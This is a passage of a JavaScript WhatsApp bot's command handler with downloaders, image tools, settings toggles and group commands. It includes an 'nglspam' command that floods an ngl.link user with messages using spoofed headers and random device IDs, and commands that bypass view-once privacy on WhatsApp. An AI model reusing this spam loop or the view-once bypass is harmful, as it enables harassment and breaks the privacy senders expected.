        if (!data?.data?.length) return reply(`⚠️ No media found.`);

        for (const item of data.data) {
            const head = await axios.head(item.url);
            const mime = head.headers['content-type'];

            if (/image/.test(mime)) {
                await dave.sendMessage(m.chat, { image: { url: item.url }, caption: '✅ Image downloaded successfully.' }, { quoted: m });
            } else if (/video/.test(mime)) {
                await dave.sendMessage(m.chat, { video: { url: item.url }, caption: '🎥 Video downloaded successfully.' }, { quoted: m });
            } else {
                await reply(`⚠️ Unsupported media type: ${mime}`);
            }
        }
    } catch (err) {
        reply(`❌ Error: ${err.message}`);
    }
}
break;

// === CAPCUT DOWNLOADER ===
case 'capcut': case 'cc': {
    if (!text) return reply(`❌ Example: ${prefix + command} <CapCut Link>`);
    try {
        const res = await fetch(`https://api.siputzx.my.id/api/d/capcut?url=${text}`);
        const data = await res.json();
        if (!data?.data?.length) return reply(`⚠️ No media found.`);

        for (const item of data.data) {
            const head = await axios.head(item.url);
            const mime = head.headers['content-type'];

            if (/image/.test(mime)) {
                await dave.sendMessage(m.chat, { image: { url: item.url }, caption: '✅ Image downloaded successfully.' }, { quoted: m });
            } else if (/video/.test(mime)) {
                await dave.sendMessage(m.chat, { video: { url: item.url }, caption: '🎥 Video downloaded successfully.' }, { quoted: m });
            } else {
                await reply(`⚠️ Unsupported media type: ${mime}`);
            }
        }
    } catch (err) {
        reply(`❌ Error: ${err.message}`);
    }
}
break;

// === FACE BLUR ===
case 'faceblur': case 'blurface': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime.startsWith('image/')) return reply(`⚠️ Please reply to an image.`);

    try {
        const media = await dave.downloadAndSaveMediaMessage(q);
        const response = await CatBox(media);
        await dave.sendMessage(
            m.chat,
            { image: { url: `https://api.siputzx.my.id/api/iloveimg/blurface?image=${response}` }, caption: footer },
            { quoted: m }
        );
        await fs.promises.unlink(media).catch(() => {});
    } catch (err) {
        reply(`❌ Error applying blur: ${err.message}`);
    }
}
break;



// ============ WAIFU/NSFW IMAGES ============ //
case 'neko': case 'megumin': case 'trap': case 'blowjob': 
case 'hentai': case 'boobs': case 'ass': case 'pussy': 
case 'thighs': case 'lesbian': case 'lewdneko': case 'cum': {
    if (!daveshown && !isPremium) return reply('❌ This command is for Premium users only.');
    reply("🔄 Loading...");

    try {
        // Try NSFW endpoint first
        let nsfw = await fetchJson(`https://api.waifu.pics/nsfw/${command}`);
        if (nsfw?.url) {
            return await dave.sendMessage(
                m.chat,
                { image: { url: nsfw.url }, caption: foother },
                { quoted: m }
            );
        }

        // Fallback to SFW endpoint if NSFW fails
        let sfw = await fetchJson(`https://api.waifu.pics/sfw/${command}`);
        if (sfw?.url) {
            return await dave.sendMessage(
                m.chat,
                { image: { url: sfw.url }, caption: foother },
                { quoted: m }
            );
        }

        reply("Sorry, no result found for that tag.");
    } catch (err) {
        console.error(err);
        reply("Failed to fetch image. Try again later.");
    }
}
break;

// ============ BING IMAGE GENERATOR ============ //
case 'imagebing':
case 'bingimage':
case 'imgbing':
case 'bingimg': {
    if (!args.length) return reply('❌ Please provide a prompt.\nExample: .imgbing red sports car');

    const query = encodeURIComponent(args.join(' '));
    const url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;

    try {
        // React to show processing
        await dave.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // Fetch images
        const res = await fetch(url);
        const data = await res.json();

        if (data.status !== 200 || !data.data?.result?.length)
            return reply('⚠️ No images found for your prompt!');

        // Send each image
        for (const img of data.data.result) {
            await dave.sendMessage(
                m.chat,
                { image: { url: img }, caption: `🎨 Generated Image` },
                { quoted: m }
            );
        }

        // React to show completion
        await dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error(err);
        reply('❌ Error fetching image: ' + (err.message || err.toString()));
    }
}
break;

case 'autorecordtype': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    // Use global settings
    const settings = global.settings
    
    if (q === 'on') {
        if (settings.autorecord.enabled && settings.autotyping.enabled) 
            return reply('Auto recording and typing is already activated')
        
        settings.autorecord.enabled = true
        settings.autotyping.enabled = true
        global.saveSettings(settings)
        global.settings = settings
        
        reply('Successfully activated auto recording and typing')
    } 
    else if (q === 'off') {
        if (!settings.autorecord.enabled && !settings.autotyping.enabled) 
            return reply('Auto recording and typing is already deactivated')
        
        settings.autorecord.enabled = false
        settings.autotyping.enabled = false
        global.saveSettings(settings)
        global.settings = settings
        
        reply('Successfully deactivated auto recording and typing')
    } 
    else {
        const recordStatus = settings.autorecord.enabled ? 'activated' : 'deactivated'
        const typeStatus = settings.autotyping.enabled ? 'activated' : 'deactivated'
        reply(
            `Auto Record: ${recordStatus}\n` +
            `Auto Type: ${typeStatus}\n\n` +
            `Use: ${prefix}autorecordtype on/off`
        )
    }
}
break
        
                
                
//==================================================//              
        case "desc": case "setdesc": { 
                 if (!m.isGroup) return reply (mess.group)
                 if (!isAdmins) return reply ("bot must be admin in this group")
                 if (!text) throw 'Provide the text for the group description' 
                 await dave.groupUpdateDescription(m.chat, text); 
 m.reply('Group description successfully updated!'); 
             } 
 break; 
//==================================================//      



case "setbiobot":
case "setbotbio": {
    if (!daveshown) return reply(mess.owner);
    if (!text) return reply(`Where is the text?\nExample: ${prefix + command} 𝘿𝙖𝙫𝙚𝘼𝙄`);
    
    await dave.updateProfileStatus(text);
    global.caption = text;   // update caption globally
    global.footer = text;    // update footer to reflect new bio
    reply(`Successfully changed the bot's bio to:\n*${text}*`);
}
break;



case 'removal':
case 'removebackground': {
  if (!quoted) return reply(`Where’s the photo?`);
  if (!/image/.test(mime)) return reply(`Send or reply to an image with caption ${prefix + command}`);

  // React to show processing
  await doReact('⏳', m, dave);

  // Download media
  let media = await dave.downloadAndSaveMediaMessage(quoted);

  // Upload to CatBox
  let response = await CatBox(media); // Ensure CatBox returns a direct URL
  fs.unlinkSync(media); // optional cleanup

  // Send removed-bg image
  await dave.sendMessage(
    m.chat,
    {
      image: {
        url: `https://api.siputzx.my.id/api/iloveimg/removebg?image=${encodeURIComponent(response)}`
      },
      caption: footer
    },
    { quoted: m }
  );
}
break;



 case 'save': {
  try {
    const quotedMessage = m.msg?.contextInfo?.quotedMessage;

    // Check if user quoted a message
    if (!quotedMessage) {
      return m.reply('Please reply to a status message');
    }

    // Verify it's a status message
    if (!m.quoted?.chat?.endsWith('@broadcast')) {
      return m.reply('That message is not a status! Please reply to a status message.');
    }

    // Download the media first
    const mediaBuffer = await dave.downloadMediaMessage(m.quoted);
    if (!mediaBuffer || mediaBuffer.length === 0) {
      return m.reply('Could not download the status media. It may have expired.');
    }

    // Determine media type and prepare payload
    let payload;
    let mediaType;

    if (quotedMessage.imageMessage) {
      mediaType = 'image';
      payload = {
        image: mediaBuffer,
        caption: quotedMessage.imageMessage.caption || '📸 Saved status image',
        mimetype: 'image/jpeg'
      };
    } 
    else if (quotedMessage.videoMessage) {
      mediaType = 'video';
      payload = {
        video: mediaBuffer,
        caption: quotedMessage.videoMessage.caption || '🎥 Saved status video',
        mimetype: 'video/mp4'
      };
    } 
    else {
      return m.reply('Only image and video statuses can be saved!');
    }

    // Send to user's DM
    await dave.sendMessage(
      m.sender, 
      payload,
      { quoted: m }
    );

    // Confirm in chat
    return m.reply(`✅  ${mediaType} Saved by 𝘿𝙖𝙫𝙚𝘼𝙄!`);

  } catch (error) {
    console.error('Save error:', error);
    if (error.message.includes('404') || error.message.includes('not found')) {
      return m.reply('The status may have expired or been deleted.');
    }
    return m.reply('❌ Failed to save status. Error: ' + error.message);
  }
}
break;
//==================================================//   
case 'playdoc': {
    try {
        const tempDir = path.join(__dirname, "temp");
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

        if (!args.length) return reply(`Provide a song name!\nExample: ${command} Not Like Us`);

        const query = args.join(" ");
        if (query.length > 100) return reply(`Song name too long! Max 100 chars.`);

        await reply("Searching for the track...");

        const searchResult = await (await yts(`${query} official`)).videos[0];
        if (!searchResult) return reply("Couldn't find that song. Try another one!");

        const video = searchResult;
        const apiUrl = `https://api.privatezia.biz.id/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`;
        const response = await axios.get(apiUrl);
        const apiData = response.data;

        if (!apiData.status || !apiData.result || !apiData.result.downloadUrl) throw new Error("API failed to fetch track!");

        const timestamp = Date.now();
        const fileName = `audio_${timestamp}.mp3`;
        const filePath = path.join(tempDir, fileName);

        const audioResponse = await axios({
            method: "get",
            url: apiData.result.downloadUrl,
            responseType: "stream",
            timeout: 600000
        });

        const writer = fs.createWriteStream(filePath);
        audioResponse.data.pipe(writer);
        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        if (!fs.existsSync(filePath) || fs.statSync(filePath).size === 0)
            throw new Error("Download failed or empty file!");

        await dave.sendMessage(
            from,
            { text: `Downloaded ${apiData.result.title || video.title}` },
            { quoted: m }
        );

        await dave.sendMessage(
            from,
            {
                document: { url: filePath },
                mimetype: "audio/mpeg",
                fileName: `${(apiData.result.title || video.title).substring(0, 100)}.mp3`
            },
            { quoted: m }
        );

        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

    } catch (error) {
        console.error("Play command error:", error);
        return reply(`Error: ${error.message}`);
    }
}
break

// === Join Group by Link ===
case 'joingc':
case 'join': {
  if (!daveshown) return reply(mess.owner);
  if (!text) return reply("Where’s the group link?");
  if (!text.includes("chat.whatsapp.com")) return reply("Invalid WhatsApp group link!");
  let result = text.split('https://chat.whatsapp.com/')[1];
  let id = await dave.groupAcceptInvite(result);
  reply(`✅ Successfully joined group: ${id}`);
}
break;

// === Convert Quoted Message to JSON ===
case "tojs":
case "q": {
  if (!daveshown) return reply(mess.owner);
  if (!m.quoted) return reply("Reply to a message!");
  let jsonData = JSON.stringify(m.quoted, null, 2);
  reply(jsonData);
}
break;

// === Read View-Once Messages ===
case "viewonce":
case "openviewonce": {
  if (!daveshown) return reply(mess.owner);
  if (!m.quoted) return reply("Reply to a view-once message!");

  let msg =
    m?.quoted?.message?.imageMessage ||
    m?.quoted?.message?.videoMessage ||
    m?.quoted?.message?.audioMessage ||
    m?.quoted;

  if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce)
    return reply("That message is not a view-once message!");

  const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
  let media = await downloadContentFromMessage(
    msg,
    msg.mimetype == 'image/jpeg'
      ? 'image'
      : msg.mimetype == 'video/mp4'
      ? 'video'
      : 'audio'
  );

  let type = msg.mimetype;
  let buffer = Buffer.from([]);
  for await (const chunk of media) buffer = Buffer.concat([buffer, chunk]);

  if (/video/.test(type)) {
    return dave.sendMessage(m.chat, { video: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/image/.test(type)) {
    return dave.sendMessage(m.chat, { image: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/audio/.test(type)) {
    return dave.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
  }
}
break;

// === Send Custom Interactive Message ===

case 'sendchat': {
  if (!daveshown) return reply(mess.owner);
  if (!text) return reply(`Example: ${prefix + command} Hello | 2547XXXXXXXX | https://example.com`);

  let [messageText, targetNumber] = text.split('|').map(v => v.trim());
  if (!messageText) messageText = '';
  if (!targetNumber) return reply('❌ Target number missing');

  const targetJid = `${targetNumber}@s.whatsapp.net`;

  try {
    // Optional thumbnail
    let thumbBuffer = null;
    if (global.thumb) {
      try {
        thumbBuffer = Buffer.from(await (await fetch(global.thumb)).arrayBuffer());
      } catch {}
    }

    // Send simple message
    await dave.sendMessage(targetJid, {
      text: messageText,
      ...(thumbBuffer ? { thumbnail: thumbBuffer } : {})
    });

    reply('✅ Successfully sent the message');
  } catch (err) {
    console.error(err);
    reply('❌ Failed to send message');
  }
}
break;
  



// ================== REACT CHANNEL ==================


// ================== NGL SPAM ==================
case "nglspam": {
  if (!daveshown) return reply(mess.owner);

  if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
    return reply("Enter username, message, and spam amount!\nExample: .nglspam sjasj|hello|5");
  }

  async function sendSpamMessage(username, message, spamCount) {
    let counter = 0;
    while (counter < spamCount) {
      try {
        const date = new Date();
        const formattedTime = `${date.getHours()}:${date.getMinutes()}`;
        const deviceId = crypto.randomBytes(21).toString("hex");
        const url = "https://ngl.link/api/submit";
        const headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          Referer: `https://ngl.link/${username}`,
          Origin: "https://ngl.link"
        };

        const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

        const response = await fetch(url, {
          method: "POST",
          headers,
          body,
          mode: "cors",
          credentials: "include"
        });

        if (response.status !== 200) {
          console.log(`[${formattedTime}] [Error] Rate-limited`);
          await new Promise(res => setTimeout(res, 25000));
        } else {
          counter++;
          console.log(`[${formattedTime}] [Sent] Message #${counter}`);
        }
      } catch (error) {
        console.error(`[Error] ${error}`);
        await new Promise(res => setTimeout(res, 5000));
      }
    }
  }

  const [username, message, count] = text.split("|");
  const spamCount = parseInt(count, 10);
  if (isNaN(spamCount) || spamCount <= 0) {
    return reply("Spam count must be a positive number!");
  }

  try {
    await sendSpamMessage(username, message, spamCount);
    reply(`✅ Successfully sent ${spamCount} NGL messages to ${username}`);
  } catch (e) {
    console.error(e);
    reply("❌ An error occurred, please try again later.");
  }
}
break;

// ================== UPLOAD STATUS ==================
case 'uploadstatus':
case 'tostatus':
case 'gcsw':
case 'upwsgc':
case 'upswtag': {
  if (!daveshown) return reply(mess.owner);
  if (!quoted) return reply(`Quote a message (image, video, or audio) with caption ${prefix + command}`);

  let argsText = text.split(',').map(a => a.trim());
  if (argsText.length < 2) return reply(`Example: ${prefix + command} groupID, caption`);

  let target = argsText[0];
  let caption = argsText.slice(1).join(',');

  const type = Object.keys(quoted.message)[0];

  const stream = await dave.downloadContentFromMessage(quoted.message[type], type.replace('Message', ''));
  let buffer = Buffer.from([]);
  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

  let sendOptions = {};
  if (type.includes('image')) sendOptions = { image: buffer, caption };
  else if (type.includes('video')) sendOptions = { video: buffer, caption };
  else if (type.includes('audio')) sendOptions = { audio: buffer, mimetype: 'audio/mp4', ptt: true };
  else return reply('❌ Unsupported media type!');

  await dave.sendMessage(target + '@g.us', sendOptions, {
    contextInfo: { mentionedJid: [target + '@s.whatsapp.net'] }
  });

  reply('✅ Successfully uploaded status with mention!');
}
break

// ================== OFF SETTINGS ==================
case 'tovoicenote': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const ffmpeg = require('fluent-ffmpeg');
    const fs = require('fs');
    const path = require('path');
    const { tmpdir } = require('os');

    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const msg = (quotedMsg && (quotedMsg.videoMessage || quotedMsg.audioMessage))
                || m.message?.videoMessage
                || m.message?.audioMessage;

    if (!msg) return reply("Reply to a video or audio to convert it to a voice note!");

    const mime = msg.mimetype || '';
    if (!/video|audio/.test(mime)) return reply("Only works on video or audio messages!");

    reply("Converting to voice note...");

    const messageType = mime.split("/")[0];
    const stream = await downloadContentFromMessage(msg, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const inputPath = path.join(tmpdir(), `input_${Date.now()}.mp4`);
    const outputPath = path.join(tmpdir(), `output_${Date.now()}.ogg`);
    fs.writeFileSync(inputPath, buffer);

    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .inputOptions('-t 59')
        .toFormat('opus')
        .outputOptions(['-c:a libopus', '-b:a 64k'])
        .on('end', resolve)
        .on('error', reject)
        .save(outputPath);
    });

    const audioBuffer = fs.readFileSync(outputPath);
    await dave.sendMessage(from, { audio: audioBuffer, mimetype: 'audio/ogg', ptt: true }, { quoted: m });

    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);

    reply("Voice note sent!");
  } catch (err) {
    console.error("tovoicenote error:", err);
    reply("Failed to convert media to voice note. Ensure it is a valid video/audio file.");
  }
}
break

case 'toimage': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const fs = require('fs');
    const path = require('path');
    const { tmpdir } = require('os');
    const sharp = require('sharp');

    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const stickerMsg = (quotedMsg && quotedMsg.stickerMessage) || m.message?.stickerMessage;

    if (!stickerMsg || !stickerMsg.mimetype?.includes('webp')) {
      return reply("Reply to a sticker to convert it to an image!");
    }

    m.reply("Converting sticker to image...");

    const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const outputPath = path.join(tmpdir(), `sticker_${Date.now()}.png`);
    await sharp(buffer).png().toFile(outputPath);

    const imageBuffer = fs.readFileSync(outputPath);
    await dave.sendMessage(from, { image: imageBuffer }, { quoted: m });

    fs.unlinkSync(outputPath);
    reply("Sticker converted to image!");
  } catch (err) {
    console.error("toimage error:", err);
    reply("Failed to convert sticker to image.");
  }
}
break
// ================== LIST CASE ==================
case "listcase": {
  if (!daveshown) return reply(mess.owner);
  const code = fs.readFileSync('dave.js', 'utf8');
  const regex = /case\s+["'`](.+?)["'`]\s*:/g;
  let match;
  const cases = [];
  while ((match = regex.exec(code)) !== null) cases.push(match[1]);
  return reply(`
*Total Cases:* ${cases.length}

> ${cases.join("\n> ")}
`);
}
break;



        case "disp-90": { 
                 if (!m.isGroup) return reply (mess.group); 

                 if (!isAdmins) return reply (mess.admin); 

                     await dave.groupToggleEphemeral(m.chat, 90*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 90 days!'); 
 } 
 break; 
//==================================================//         
        case "disp-off": { 
                 if (!m.isGroup) return reply (mess.group); 

                 if (!isAdmins) return reply (mess.admin); 

                     await dave.groupToggleEphemeral(m.chat, 0); 
 m.reply('Dissapearing messages successfully turned off!'); 
 }
   break;

//==================================================//  
        case "disp-1": { 
                 if (!m.isGroup) return reply (mess.group); 

                 if (!isAdmins) return reply (mess.admin); 

                     await dave.groupToggleEphemeral(m.chat, 1*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
 } 
 break; 
//==================================================//  
case 'autotyping': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    // Use global settings
    const settings = global.settings
    
    if (q == 'on') {
        if (settings.autotyping.enabled) 
            return reply('Auto typing is already activated')
        
        settings.autotyping.enabled = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully activated auto typing')
    } else if (q == 'off') {
        if (!settings.autotyping.enabled) 
            return reply('Auto typing is already deactivated')
        
        settings.autotyping.enabled = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully deactivated auto typing')
    } else {
        const status = settings.autotyping.enabled ? 'activated' : 'deactivated'
        reply(`Auto typing is currently ${status}. Use: ${prefix}autotyping on/off`)
    }
}
break


//==================================================//
case 'reactch':
case 'rch': { 
  if (!daveshown) return reply(mess.owner)
  if (!text) return reply(`Example:\n${prefix + command} https://whatsapp.com/channel/xxx/123 ❤️dave\n${prefix + command} https://whatsapp.com/channel/xxx/123 ❤️dave|5`)

  const fancyText = {
    a:'🅐',b:'🅑',c:'🅒',d:'🅓',e:'🅔',f:'🅕',g:'🅖',h:'🅗',i:'🅘',j:'🅙',k:'🅚',l:'🅛',m:'🅜',n:'🅝',o:'🅞',p:'🅟',q:'🅠',r:'🅡',s:'🅢',t:'🅣',u:'🅤',v:'🅥',w:'🅦',x:'🅧',y:'🅨',z:'🅩',
    '0':'⓿','1':'➊','2':'➋','3':'➌','4':'➍','5':'➎','6':'➏','7':'➐','8':'➑','9':'➒'
  }

  const [mainText, offsetStr] = text.split('|')
  const args = mainText.trim().split(' ')
  const link = args[0]

  if (!link.includes('https://whatsapp.com/channel/'))
    return reply(`Invalid link!\nExample: ${prefix + command} https://whatsapp.com/channel/xxx/id ❤️dave|3`)

  const channelId = link.split('/')[4]
  const rawMessageId = parseInt(link.split('/')[5])
  if (!channelId || isNaN(rawMessageId)) return reply('Incomplete link!')

  const offset = parseInt(offsetStr?.trim()) || 1
  const plainText = args.slice(1).join(' ')
  const emojiText = plainText.replace(link, '').trim()
  if (!emojiText) return reply('Enter text/emoji to react with.')

  const emoji = emojiText.toLowerCase().split('').map(c => fancyText[c] || c).join('')

  try {
    const metadata = await dave.newsletterMetadata('invite', channelId)
    let success = 0, failed = 0

    for (let i = 0; i < offset; i++) {
      const msgId = (rawMessageId - i).toString()
      try {
        await dave.newsletterReactMessage(metadata.id, msgId, emoji)
        success++
      } catch {
        failed++
      }
    }
    reply(`✅ Successfully reacted *${emoji}* to ${success} messages in *${metadata.name}*\n❌ Failed on ${failed} messages`)
  } catch (err) {
    console.error(err)
    reply('❌ Failed to process your request!')
  }
}
break
//==================================================//
case 'clearchat':
case 'clear': { 
  if (!daveshown) return reply(mess.owner)
  await dave.chatModify({ 
    delete: true, 
    lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] 
  }, m.chat)
  reply('Chat successfully cleared!')
}
break
//==================================================//
case 'rvo':
case 'readviewonce': { 
  if (!daveshown) return reply(mess.owner)
  if (!m.quoted) return reply('Reply to a view-once message!')

  let msg = m?.quoted?.message?.imageMessage || 
            m?.quoted?.message?.videoMessage || 
            m?.quoted?.message?.audioMessage || 
            m?.quoted
  if (!msg.viewOnce && m.quoted.mtype !== 'viewOnceMessageV2') return reply('That’s not a view-once message!')

  const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
  let media = await downloadContentFromMessage(msg, /image/.test(msg.mimetype) ? 'image' : /video/.test(msg.mimetype) ? 'video' : 'audio')
  let buffer = Buffer.from([])
  for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])

  if (/video/.test(msg.mimetype)) return dave.sendMessage(m.chat, { video: buffer, caption: msg.caption || '' }, { quoted: m })
  else if (/image/.test(msg.mimetype)) return dave.sendMessage(m.chat, { image: buffer, caption: msg.caption || '' }, { quoted: m })
  else if (/audio/.test(msg.mimetype)) return dave.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
}
break
//==================================================//
case 'listgc': { 
  if (!daveshown) return reply(mess.owner)
  try {
    const getGroups = await dave.groupFetchAllParticipating()
    const groups = Object.values(getGroups)
    if (!groups.length) return reply('❌ The bot is not in any groups.')

    let text = `⬣ *GROUP LIST ${namaBot.toUpperCase()}*\n📊 Total Groups: ${groups.length}\n\n`

    groups.forEach((g, i) => {
      const groupId = g.id
      const groupName = g.subject
      const memberCount = g.participants?.length || 0
      const created = moment(g.creation * 1000).tz('Africa/Nairobi').format('DD/MM/YYYY HH:mm')

      text += `*${i + 1}. ${groupName}*\n🆔 ID: ${groupId}\n👥 Members: ${memberCount}\n🕐 Created: ${created}\n\n`
    })

    await dave.sendMessage(
      m.chat,
      { text },
      { quoted: m }
    )
  } catch (err) {
    console.error(err)
    reply('❌ Failed to fetch group data.')
  }
}
break

//==================================================//
//==================================================//
case 'listowner':
case 'listown': {
    if (!daveshown) return reply(mess.owner) // owner-only command

    if (owner.length < 1) return reply('❌ No additional owners found.')

    let text = `🌟 *#- List of All Additional Owners*\n\n`
    owner.forEach((o, index) => {
        let num = index + 1
        let user = o.split('@')[0]
        text += `🔹 *${num}.* ${user}\n    *Tag:* @${user}\n\n`
    })

    dave.sendMessage(m.chat, { text, mentions: owner }, { quoted: m })
}
break
//==================================================//

//==================================================//
//==================================================//       
        case 'onlygroup':
case 'onlygc': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    const settings = global.settings
    
    if (q == 'on') {
        if (settings.onlygroup) return reply('Only group is already enabled')
        
        settings.onlygroup = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully enabled only group mode')
    } else if (q == 'off') {
        if (!settings.onlygroup) return reply('Only group is already disabled')
        
        settings.onlygroup = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully disabled only group mode')
    } else {
        const status = settings.onlygroup ? 'enabled' : 'disabled'
        reply(`Only group mode is currently ${status}. Use: ${prefix}${command} on/off`)
    }
}
break

case 'onlypc': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    const settings = global.settings
    
    if (q == 'on') {
        if (settings.onlypc) return reply('Only pc is already enabled')
        
        settings.onlypc = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully enabled only pc mode')
    } else if (q == 'off') {
        if (!settings.onlypc) return reply('Only pc is already disabled')
        
        settings.onlypc = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully disabled only pc mode')
    } else {
        const status = settings.onlypc ? 'enabled' : 'disabled'
        reply(`Only pc mode is currently ${status}. Use: ${prefix}${command} on/off`)
    }
}
break

//==================================================//      
       case 'unavailable':
case 'offline': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    // Use global settings - Note: You'll need to add 'online' to your settings
    const settings = global.settings
    
    if (q === 'on') {
        if (settings.online === true) 
            return reply('Online status is already activated')
        
        settings.online = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully changed to online status')
    } else if (q === 'off') {
        if (settings.online === false) 
            return reply('Online status is already deactivated')
        
        settings.online = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully changed to unavailable status')
    } else {
        const status = settings.online ? 'online' : 'unavailable'
        reply(`Bot is currently ${status}. Use: ${prefix}${command} on/off`)
    }
}
break

//==================================================//           
        case 'antilink': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins && !daveshown) return reply(mess.admins)
    if (args.length < 1) return reply('on/off?')
    
    const settings = global.settings
    
    if (args[0] === 'on') {
        if (settings.antilink.enabled) return reply('Antilink is already enabled')
        
        settings.antilink.enabled = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Antilink is enabled')
    } else if (args[0] === 'off') {
        if (!settings.antilink.enabled) return reply('Antilink is already disabled')
        
        settings.antilink.enabled = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Antilink is disabled')
    }
}
break

case 'antilinkgc': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins && !daveshown) return reply(mess.owner)
    if (args.length < 1) return reply('on/off?')
    
    const settings = global.settings
    
    if (args[0] === 'on') {
        if (settings.antilinkgc.enabled) return reply('Antilinkgc is already enabled')
        
        settings.antilinkgc.enabled = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Antilinkgc is enabled')
    } else if (args[0] === 'off') {
        if (!settings.antilinkgc.enabled) return reply('Antilinkgc is already disabled')
        
        settings.antilinkgc.enabled = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Antilinkgc is disabled')
    }
}
break

case 'statuscheck':
case 'checkstatus': {
    if (!daveshown) return reply(mess.owner)

    const viewStatus = global.settings.autoviewstatus ? 'Enabled' : 'Disabled'
    const reactStatus = global.settings.areact.enabled ? 'Enabled' : 'Disabled'

    reply(`Auto Status Settings:\n\nAuto View: ${viewStatus}\nAuto React: ${reactStatus}`)
}
break

case 'autoview':
case 'statusview': {
    if (!daveshown) return reply(mess.owner);
    if (!args[0]) return reply('Usage: on/off');
    const mode = args[0].toLowerCase();

    const settings = global.settings;

    if (mode === 'on') {
        if (settings.autoviewstatus) return reply('Auto view status is already enabled');
        
        settings.autoviewstatus = true;
        global.saveSettings(settings);
        global.settings = settings;
        reply('Auto view status enabled');
    } else if (mode === 'off') {
        if (!settings.autoviewstatus) return reply('Auto view status is already disabled');
        
        settings.autoviewstatus = false;
        global.saveSettings(settings);
        global.settings = settings;
        reply('Auto view status disabled');
    } else {
        return reply('Invalid option, use "on" or "off"');
    }
}
break;

case 'areact': {
    if (!daveshown) return reply(mess.owner);
    if (!args[0]) return reply('Usage: on/off');
    const mode = args[0].toLowerCase();

    const settings = global.settings;

    if (mode === 'on') {
        if (settings.areact.enabled) return reply('Auto react is already enabled');
        
        settings.areact.enabled = true;
        global.saveSettings(settings);
        global.settings = settings;
        reply('Auto react enabled');
    } else if (mode === 'off') {
        if (!settings.areact.enabled) return reply('Auto react is already disabled');
        
        settings.areact.enabled = false;
        global.saveSettings(settings);
        global.settings = settings;
        reply('Auto react disabled');
    } else {
        return reply('Invalid option, use "on" or "off"');
    }
}
break;

//==================================================//
//==================================================//        
        case 'unwarning':
case 'unwarn': {
    if (!m.isGroup) return reply(mess.OnlyGrup)
    if (!isAdmins) return reply(mess.admin)

    let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (!users) return reply(`Tag or reply to a user to ${command}`)
    if (!daveshown) return reply('Feature reserved for owner or sudo numbers only')

    const settings = global.settings

    // Initialize warnings structure if it doesn't exist
    if (!settings.warnings) {
        settings.warnings = {
            enabled: true,
            maxWarnings: 3,
            chats: {}
        }
    }

    if (!settings.warnings.chats[m.chat]) {
        settings.warnings.chats[m.chat] = {}
    }

    if (!settings.warnings.chats[m.chat][users] || settings.warnings.chats[m.chat][users] === 0) {
        return reply(`User has no warnings to remove.`)
    }

